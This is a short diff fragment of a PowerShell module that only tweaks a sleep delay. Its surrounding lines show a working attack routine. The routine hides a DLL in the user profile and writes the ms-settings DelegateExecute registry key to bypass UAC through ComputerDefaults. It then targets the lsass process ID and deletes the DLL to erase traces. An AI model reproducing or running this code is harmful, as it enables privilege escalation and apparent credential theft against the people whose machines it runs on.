@@ -639,7 +639,7 @@ clear; attrib +h "$env:USERPROFILE\mcucbps.dll" ;sleep(9.3)
 cmd /c powershell -Command "New-ItemProperty -Path 'HKCU:\software\classes\ms-settings\shell\open\command' -Name 'DelegateExecute' -Value '' -Force |OUT-NULL";clear
 $IDPORT = (get-process lsass).Id;ComputerDefaults -PID '$IDPORT' -File '$Request'
 clear
-sleep(2.3)
+sleep(2.5)
 del "$env:USERPROFILE\mcucbps.dll" -force -ErrorAction ignore
 }
 Export-ModuleMember -Function process-aucdown
